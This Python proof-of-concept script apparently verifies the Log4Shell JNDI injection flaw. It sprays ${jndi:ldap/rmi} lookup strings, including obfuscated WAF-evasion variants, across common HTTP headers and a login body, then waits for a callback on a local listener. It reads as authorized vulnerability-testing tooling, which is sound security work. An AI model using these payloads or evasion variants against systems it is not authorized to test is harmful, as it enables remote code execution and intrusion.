#!/usr/bin/env python3
"""
PoC: JNDI Injection (Log4Shell) - Java Targets Only

Vulnerability: User-controlled input flows into a Log4j/Log4j2 logger call
(CVE-2021-44228 "Log4Shell", CVSS 10.0). The logger evaluates ${jndi:ldap://...}
expressions in message strings, triggering an outbound TCP connection to the
attacker-controlled address.

Language gate: JAVA TARGETS ONLY — JNDI is a Java-only API.

Validation strategy:
  - A TCP listener on port 59877 is started before injection
  - JNDI payloads are injected in all common HTTP headers
  - Confirmation: TCP callback received on port 59877

Usage (authorized testing only, inside Docker):
    python poc_jndi_injection_001.py --target http://localhost:8080 --timeout 30

Exit codes:
    0 - CONFIRMED: TCP callback received (JNDI lookup triggered)
    1 - NOT_REPRODUCED: no callback within timeout
    2 - ERROR: script error

IMPORTANT: Only use against systems you have explicit written authorization
to test. For Java targets only.
"""

import argparse
import os
import secrets
import socket
import subprocess
import sys
import threading
import time

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("[ERROR] JNDI-001: 'requests' library is required.")
    sys.exit(2)

VULN_ID = "JNDI-001"
CALLBACK_PORT = 59877

# JNDI lookup expressions — inject into HTTP headers
def build_payloads(jndi_id: str, callback_host: str = "127.0.0.1") -> list:
    base = f"ldap://{callback_host}:{CALLBACK_PORT}/{jndi_id}"
    return [
        f"${{jndi:{base}}}",
        # Obfuscated variants (WAF bypass)
        f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:{base}}}",
        f"${{j${{::-n}}di:{base}}}",
        # RMI protocol fallback
        f"${{jndi:rmi://{callback_host}:{CALLBACK_PORT}/{jndi_id}}}",
    ]


# Headers known to be logged by Java applications
INJECTION_HEADERS = [
    "User-Agent",
    "X-Forwarded-For",
    "X-Api-Version",
    "X-Forwarded-Host",
    "Referer",
    "CF-Connecting-IP",
    "X-Real-IP",
    "X-Custom-IP-Authorization",
    "Accept-Language",
    "X-Originating-IP",
]


class CallbackListener:
    """TCP listener that detects inbound LDAP/RMI callback."""

    def __init__(self, port: int):
        self.port = port
        self.received = False
        self.data = b""
        self._server = None
        self._thread = None

    def start(self):
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self._server.bind(("0.0.0.0", self.port))
            self._server.listen(5)
            self._server.settimeout(1.0)
        except OSError as e:
            print(f"[!] {VULN_ID}: Could not bind port {self.port}: {e}")
            return False
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()
        return True

    def _accept_loop(self):
        while not self.received:
            try:
                conn, addr = self._server.accept()
                self.data = conn.recv(1024)
                self.received = True
                conn.close()
            except socket.timeout:
                continue
            except Exception:
                break

    def stop(self):
        if self._server:
            self._server.close()

    def wait_for_callback(self, timeout: float) -> bool:
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.received:
                return True
            time.sleep(0.2)
        return False


def inject_headers(session, target: str, payloads: list, timeout: int) -> bool:
    """Send requests with JNDI payloads in all injection-prone headers."""
    endpoints = ["/", "/api", "/login", "/search", "/health"]
    injected = False

    for payload in payloads:
        headers = {h: payload for h in INJECTION_HEADERS}
        headers["User-Agent"] = payload  # Highest-value single header

        for endpoint in endpoints:
            url = target.rstrip("/") + endpoint
            try:
                # GET with payload headers
                session.get(url, headers=headers, timeout=5, allow_redirects=False)
                # POST with payload in body fields (some apps log request body)
                session.post(
                    url,
                    json={"username": payload, "password": "test"},
                    headers=headers,
                    timeout=5,
                    allow_redirects=False,
                )
                injected = True
            except RequestException:
                pass

    return injected


def run_exploit(target: str, timeout: int):
    jndi_id = secrets.token_hex(8)
    print(f"[*] {VULN_ID}: JNDI Injection PoC (Log4Shell)")
    print(f"[*] {VULN_ID}: Target: {target}")
    print(f"[*] {VULN_ID}: JNDI callback ID: {jndi_id}")
    print(f"[*] {VULN_ID}: Listening on port {CALLBACK_PORT} for TCP callback")

    listener = CallbackListener(CALLBACK_PORT)
    if not listener.start():
        print(f"[ERROR] {VULN_ID}: Failed to start TCP listener on port {CALLBACK_PORT}")
        return 2, {}

    session = requests.Session()

    # Verify target reachable
    try:
        probe = session.get(target, timeout=10)
        print(f"[*] {VULN_ID}: Target reachable (HTTP {probe.status_code})")
    except RequestException as e:
        listener.stop()
        print(f"[ERROR] {VULN_ID}: Target unreachable: {e}")
        return 2, {}

    payloads = build_payloads(jndi_id)
    print(f"[*] {VULN_ID}: Injecting {len(payloads)} JNDI variants across {len(INJECTION_HEADERS)} headers...")

    inject_headers(session, target, payloads, timeout)

    # Wait for callback
    wait_time = min(timeout, 10)
    print(f"[*] {VULN_ID}: Waiting {wait_time}s for LDAP/RMI callback...")
    callback_received = listener.wait_for_callback(wait_time)
    listener.stop()

    if callback_received:
        evidence = f"TCP callback received on port {CALLBACK_PORT}; data: {listener.data[:64]!r}"
        print(f"[CONFIRMED] {VULN_ID}: JNDI lookup triggered! {evidence}")
        return 0, {"jndi_id": jndi_id, "evidence": evidence, "callback_data": str(listener.data)}

    print(f"[-] {VULN_ID}: No TCP callback received within {wait_time}s")
    print(f"[*] {VULN_ID}: Check if Log4j < 2.17.0 is in use (pom.xml / build.gradle)")
    return 1, {"jndi_id": jndi_id}


def main():
    parser = argparse.ArgumentParser(
        description=f"PoC for JNDI Injection / Log4Shell ({VULN_ID}) — Java targets only",
        epilog="For authorized security testing of Java applications only.",
    )
    parser.add_argument("--target", default="http://localhost:8080")
    parser.add_argument("--timeout", type=int, default=30)
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        print(f"[ERROR] {VULN_ID}: Target must start with http:// or https://")
        sys.exit(2)

    try:
        exit_code, results = run_exploit(target, args.timeout)
    except KeyboardInterrupt:
        print(f"\n[!] {VULN_ID}: Interrupted")
        sys.exit(2)
    except Exception as e:
        print(f"[ERROR] {VULN_ID}: Unhandled exception: {e}")
        sys.exit(2)

    if exit_code == 0:
        print(f"[CONFIRMED] {VULN_ID}: JNDI injection confirmed (CVSS 10.0)")
    elif exit_code == 1:
        print(f"[NOT_REPRODUCED] {VULN_ID}: JNDI injection not reproduced")
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
